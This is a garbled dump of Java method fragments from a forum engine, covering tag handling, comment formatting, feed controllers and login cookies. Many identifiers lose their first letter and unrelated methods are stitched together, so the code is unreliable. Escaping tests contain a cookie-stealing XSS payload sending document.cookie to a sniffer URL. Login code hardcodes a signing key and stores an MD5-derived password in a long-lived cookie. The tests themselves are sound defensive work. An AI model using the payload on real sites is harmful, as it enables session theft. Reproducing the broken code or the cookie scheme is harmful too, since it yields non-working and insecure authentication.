public int getTagId ( String agName ) hrows TagNotFoundException { return getTagId ( agName , false ) ; } 
public int getTagId ( String ag ) hrows UserErrorException , TagNotFoundException { checkTag ( ag ) ; return agDao . getTagId ( ag , rue ) ; } 
public int getCounter ( String ag ) hrows TagNotFoundException { int agId = agDao . getTagId ( ag ) ; return agDao . getCounter ( agId ) ; } 
public View agFeedOld ( TopicListRequest opicListForm ) { return new RedirectView ( agListUrl ( opicListForm . getTag ( ) ) ) ; } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public void favoriteAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , rue ) ; } 
public void favoriteDel ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , rue ) ; } 
public void ignoreAdd ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . addTag ( user . getId ( ) , agId , false ) ; } 
public void ignoreDel ( User user , String agName ) hrows TagNotFoundException { int agId = agDao . getTagId ( agName ) ; userTagDao . deleteTag ( user . getId ( ) , agId , false ) ; } 
public void changeTest ( ) hrows Exception { when ( agDao . getTagId ( " estTag " ) ) . henReturn ( 123 ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henReturn ( 456 ) ; when ( agDao . getTagId ( " InvalidTestTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; when ( agDao . getTagId ( " estNewTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareChangeDataBinder ( ) ; agService . change ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void deleteTest ( ) hrows Exception { when ( agDao . getTagId ( " InvalidTestTag " ) ) . henThrow ( new TagNotFoundException ( " TagNotFoundException " ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " InvalidTestTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " #$%@@#%$ " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " #$%@@#%$ " , " estNewTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estTag " , binder . getBindingResult ( ) ) ; assertTrue ( binder . getBindingResult ( ) . hasErrors ( ) ) ; prepareDeleteDataBinder ( ) ; agService . delete ( " estTag " , " estNewTag " , binder . getBindingResult ( ) ) ; assertFalse ( binder . getBindingResult ( ) . hasErrors ( ) ) ; } 
public void resetMockObjects ( ) hrows Exception { reset ( userTagDao ) ; reset ( agDao ) ; when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( 2 ) ; user = getUser ( 1 ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagId ( " ag1 " ) ) . henReturn ( 2 ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void addMultiplyTagsTest ( ) { UserTagService mockUserTagService = mock ( UserTagService . class ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . henCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . henCallRealMethod ( ) ; ry { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag3 " ) ) ; } catch ( Exception e ) { } List < String > strErrors = mockUserTagService . addMultiplyTags ( user , " ag1, tag2, tag3, uytutut, @#$%$# " , rue ) ; ry { verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag1 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag2 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; reset ( mockUserTagService ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . henCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . henCallRealMethod ( ) ; ry { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag3 " ) ) ; } catch ( Exception e ) { } strErrors = mockUserTagService . addMultiplyTags ( user , " ag1, tag2, tag3, uytutut, @#$%$# " , false ) ; ry { verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag1 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag2 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( 3 , strErrors . size ( ) ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public int addToMemories ( User user , Topic opic , boolean watch ) { ry { return doAddToMemories ( user , opic , watch ) ; 
private int doAddToMemories ( User user , Topic opic , boolean watch ) { int id = getId ( user , opic , watch ) ; if ( id = = 0 ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( 
public String format ( String ext , boolean secure ) { String escapedText = StringUtil . escapeHtml ( ext . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) ; } 
public void pTest ( ) { assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " est ntest1 ntest2 " , false ) ) ; 
public void agEscapeTest ( ) { assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false ) ) ; 
public void badListTest ( ) { assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false ) ) ; 
public void codeEscapeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false ) ) ; 
public void estMDash ( ) { assertEquals ( " est&nbsp;&mdash; test " , oHtmlFormatter . format ( " est -- test " , false ) ) ; assertEquals ( " <p>test&nbsp;&mdash; test</p> " , lorCodeService . parseComment ( " est -- test " , false ) ) ; assertEquals ( " <p>test<div class= \" code \" ><pre class= \" no-highlight \" ><code> -- </code></pre></div>test</p> " , lorCodeService . parseComment ( " est[code] -- [/code]test " , false ) ) ; 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter , HttpServletRequest request ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; Template mpl = Template . getTemplate ( request ) ; modelAndView . addObject ( " isModeratorSession " , mpl . isModeratorSession ( ) ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ! mpl . isModeratorSession ( ) ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByFirstLetter ( firstLetter ) ; if ( ags . size ( ) = = 0 ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
List < String > showTagListHandlerJSON ( @RequestParam ( " erm " ) final String erm ) { Map < String , Integer > ags = agService . getTagsByFirstLetter ( erm . substring ( 0 , 1 ) ) ; return ImmutableList . copyOf ( Iterables . filter ( ags . keySet ( ) , new Predicate < String > ( ) { @Override 
public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) hrows TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " ags " ) ; SortedSet < String > firstLetters = agService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > ags = agService . getTagsByFirstLetter ( firstLetter ) ; if ( ags . size ( ) = = 0 ) { hrow new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " ags " , ags ) ; return modelAndView ; } 
public ModelAndView showDefaultTagListHandlertags ( ) hrows TagNotFoundException { return showTagListHandler ( " " ) ; } 
public int doAfterBody ( ) hrows JspException { ry { BodyContent bc = getBodyContent ( ) ; String body = bc . getString ( ) ; JspWriter out = bc . getEnclosingWriter ( ) ; out . print ( makeTitle ( body ) ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } return SKIP_BODY ; } 
public int doAfterBody ( ) hrows JspException { ry { BodyContent bc = getBodyContent ( ) ; String body = bc . getString ( ) ; JspWriter out = bc . getEnclosingWriter ( ) ; if ( body ! = null & & ! body . rim ( ) . isEmpty ( ) ) { out . print ( processTitle ( body ) ) ; } } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } return SKIP_BODY ; } 
public static String processTitle ( String itle ) { return itle . replace ( ToHtmlFormatter . MDASH_REGEX , ToHtmlFormatter . MDASH_REPLACE ) ; } 
public void requestValidator ( WebDataBinder binder ) { commentService . requestValidator ( binder ) ; } 
public void initBinder ( WebDataBinder binder ) { commentService . initBinder ( binder ) ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new CommentRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Topic . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext . split ( " , " ) [ 0 ] ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String ext ) hrows IllegalArgumentException { if ( ext . isEmpty ( ) | | " 0 " . equals ( ext ) ) { setValue ( null ) ; return ; } ry { setValue ( commentDao . getById ( Integer . parseInt ( ext ) ) ) ; } catch ( MessageNotFoundException e ) { hrow new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public void setAsText ( String ext ) hrows IllegalArgumentException { ry { setValue ( messageDao . getById ( Integer . parseInt ( ext . split ( " , " ) [ 0 ] ) ) ) ; 
private String processMessage ( String msg , String mode ) { if ( " ntobr " . equals ( mode ) ) { return oLorCodeFormatter . format ( msg , rue ) ; 
public Comment getById ( int id ) hrows MessageNotFoundException { return commentDao . getById ( id ) ; } 
private String makeLogString ( String message , String remoteAddress , String xForwardedFor ) { StringBuilder logMessage = new StringBuilder ( ) ; logMessage . append ( message ) . append ( " ; ip: " ) . append ( remoteAddress ) ; if ( xForwardedFor ! = null ) { logMessage . append ( " XFF: " ) . append ( xForwardedFor ) ; } return logMessage . oString ( ) ; } 
public void updateComment ( final int msgid ) { Preconditions . checkArgument ( msgid ! = 0 , " msgid==0!? " ) ; jmsTemplate . send ( queue , new MessageCreator ( ) { @Override 
public boolean preHandle ( HttpServletRequest request , HttpServletResponse response , Object handler ) hrows Exception { if ( handler instanceof ResourceHttpRequestHandler | | handler instanceof DefaultServletHttpRequestHandler ) { return rue ; } CommonsLogStopWatch watch = new CommonsLogStopWatch ( handler . getClass ( ) . getSimpleName ( ) ) ; watch . setTimeThreshold ( TIME_THRESHOLD ) ; request . setAttribute ( ATTRIBUTE , watch ) ; return rue ; } 
public void postHandle ( HttpServletRequest request , HttpServletResponse response , Object handler , ModelAndView modelAndView ) hrows Exception { StopWatch stopWatch = ( StopWatch ) request . getAttribute ( ATTRIBUTE ) ; if ( stopWatch ! = null ) { stopWatch . stop ( ) ; 
private void createCookies ( HttpServletResponse response , HttpSession session , User user ) { Cookie cookie = new Cookie ( " password " , user . getMD5 ( configuration . getSecret ( ) ) ) ; cookie . setMaxAge ( 60 * 60 * 24 * 31 * 24 ) ; cookie . setPath ( " / " ) ; cookie . setHttpOnly ( rue ) ; response . addCookie ( cookie ) ; Cookie prof = new Cookie ( " profile " , user . getNick ( ) ) ; prof . setMaxAge ( 60 * 60 * 24 * 31 * 12 ) ; prof . setPath ( " / " ) ; response . addCookie ( prof ) ; user . acegiSecurityHack ( response , session ) ; } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGI_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); acegi.setHttpOnly(true); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public ModelAndView agFeed ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response , @PathVariable String ag ) hrows Exception { opicListForm . setTag ( ag ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; boolean rss = opicListForm . getOutput ( ) ! = null & & " rss " . equals ( opicListForm . getOutput ( ) ) ; if ( ! rss ) { modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; } Template mpl = Template . getTemplate ( request ) ; if ( mpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( mpl . getCurrentUser ( ) , opicListForm . getTag ( ) ) ) ; } } modelAndView . addObject ( " counter " , agService . getCounter ( ag ) ) ; modelAndView . addObject ( " url " , agListUrl ( ag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . setViewName ( " ag-topics " ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest opicListForm , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , TopicListRequest opicListForm , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { opicListForm . setSection ( Section . getSection ( section ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private ModelAndView group ( HttpServletRequest request , TopicListRequest opicListForm , String groupName , HttpServletResponse response ) hrows Exception { Section section = sectionService . getSection ( opicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , group ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public PreparedComment prepareComment ( Comment comment , boolean secure ) hrows UserNotFoundException { return prepareComment ( comment , null , secure , false ) ; } 
public List < PreparedComment > prepareCommentListRSS ( CommentList comments , List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure , rue ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure ) hrows UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments , secure , false ) ) ; } return commentsPrepared ; } 
private String prepareCommentText ( MessageText messageText , final boolean secure ) { if ( messageText . isLorcode ( ) ) { return lorCodeService . parseComment ( messageText . getText ( ) , secure ) ; 
private String prepareCommentTextRSS ( MessageText messageText , final boolean secure ) { return lorCodeService . prepareTextRSS ( messageText . getText ( ) , secure , messageText . isLorcode ( ) ) ; } 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss ) ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list , boolean secure ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . newArrayList ( Iterables . ransform ( list , new Function < Comment , Integer > ( ) { @Override public Integer apply ( Comment comment ) { return comment . getId ( ) ; } } ) ) ) ; List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; commentsPrepared . add ( prepareComment ( ext , comment , comments , secure , false ) ) ; } return commentsPrepared ; } 
public Integer apply ( Comment comment ) { return comment . getId ( ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { String ext = resultSet . getString ( " message " ) ; boolean lorcode = resultSet . getBoolean ( " bbcode " ) ; out . put ( resultSet . getInt ( " id " ) , new MessageText ( ext , lorcode ) ) ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; opicListForm . setSection ( Section . getSection ( section ) ) ; opicListForm . setYear ( year ) ; opicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , opicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public void edit ( final Comment oldComment , final Comment newComment , final String commentBody ) { jdbcTemplate . update ( " UPDATE comments SET title=? WHERE id=? " , newComment . getTitle ( ) , oldComment . getId ( ) ) ; jdbcTemplate . update ( " UPDATE msgbase SET message=? WHERE id=? " , 
public Boolean isModeratorAllowedToEditComments ( ) { String property = properties . getProperty ( " comment.isModeratorAllowedToEdit " ) ; if ( property = = null ) return false ; return Boolean . valueOf ( property ) ; } 
public boolean isCommentsEditingAllowed ( CommentRequest commentRequest , HttpServletRequest request , User user , Errors errors ) { Template mpl = Template . getTemplate ( request ) ; Boolean editable = mpl . isModeratorSession ( ) & & configuration . isModeratorAllowedToEditComments ( ) ; if ( ! editable ) { editable = commentRequest . getOriginal ( ) . getUserid ( ) = = user . getId ( ) ; } return editable ; } 
private boolean doDeleteComment ( int msgid , String reason , User user , int scoreBonus ) { int inReplyId = jdbcTemplate . queryForInt ( " SELECT replyto FROM comments WHERE id=? AND NOT deleted " , msgid ) ; int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
public boolean isHaveAnswers ( int commentId ) { int answersCount = jdbcTemplate . queryForInt ( " select count (id) from comments where replyto = ? " , commentId ) ; return answersCount ! = 0 ; } 
public boolean isHaveAnswers ( ) { return haveAnswers ; } 
private PreparedComment prepareComment ( Comment comment , CommentList comments , boolean secure , boolean rss ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; return prepareComment ( messageText , comment , comments , secure , rss ) ; } 
public PreparedComment prepareComment ( Comment comment , String message , boolean secure ) hrows UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure ) ; return new PreparedComment ( comment , author , processedMessage , null , commentService . isHaveAnswers ( comment ) ) ; } 
public boolean isHaveAnswers ( Comment comment ) { return commentDao . isHaveAnswers ( comment . getId ( ) ) ; } 
public Boolean isCommentEditingAllowedIfAnswersExists ( ) { String property = properties . getProperty ( " comment.isEditingAllowedIfAnswersExists " ) ; if ( property = = null ) return false ; return Boolean . valueOf ( property ) ; } 
public void processRow ( ResultSet resultSet ) hrows SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editInfoDTOs . add ( editHistoryDto ) ; } 
public ModelAndView showCommentEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) hrows Exception { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment , request . isSecure ( ) ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; List < String > javaScriptsForLayout = new ArrayList < String > ( ) ; javaScriptsForLayout . add ( " diff_match_patch.js " ) ; javaScriptsForLayout . add ( " lor_view_diff_history.js " ) ; modelAndView . addObject ( " javascriptsForLayout " , javaScriptsForLayout ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; return modelAndView ; } 
public void updateLatestEditorInfo ( int id , int editorId , Date editDate , int editCount ) { jdbcTemplate . update ( " UPDATE comments set editor_id = ? , edit_date = ?, edit_count = ? WHERE id = ? " , 
public void updateLatestEditorInfo ( User editor , Comment original , Comment comment ) { List < EditHistoryDto > editHistoryDtoList = editHistoryService . getEditInfo ( original . getId ( ) , EditHistoryObjectTypeEnum . COMMENT ) ; int historySize = editHistoryDtoList . size ( ) ; if ( historySize = = 1 ) { historySize = 0 ; } commentDao . updateLatestEditorInfo ( original . getId ( ) , 
public boolean deleteComment ( int msgid , String reason , User user , int scoreBonus ) { int inReplyId = jdbcTemplate . queryForInt ( " SELECT replyto FROM comments WHERE id=? AND NOT deleted " , msgid ) ; int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; if ( deleteCount > 0 ) { deleteInfoDao . insert ( msgid , user , reason , scoreBonus ) ; 
